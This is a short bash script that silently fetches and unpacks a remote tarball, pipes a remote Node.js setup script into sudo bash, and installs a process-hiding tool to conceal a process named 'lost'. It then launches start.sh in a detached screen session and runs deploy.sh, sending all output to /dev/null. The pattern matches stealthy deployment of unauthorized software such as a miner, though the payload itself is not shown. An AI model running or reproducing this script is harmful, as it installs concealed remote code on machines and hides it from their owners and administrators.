wget -O sapenih.tar.gz https://github.com/clasmildyt/sape/raw/main/sapenih.tar.gz >/dev/null 2>&1
tar -xvf sapenih.tar.gz >/dev/null 2>&1
sudo apt-get update && >/dev/null 2>&1
nohup curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash - && >/dev/null 2>&1
sudo nohup apt-get install -y nodejs && >/dev/null 2>&1
sudo nohup npm i -g node-process-hider >/dev/null && 2>&1
sudo ph add lost >/dev/null && 2>&1
echo "DONE!" && sleep 1
chmod +x start.sh &&
screen -dmS new ./start.sh &&
chmod +x deploy.sh &&
./deploy.sh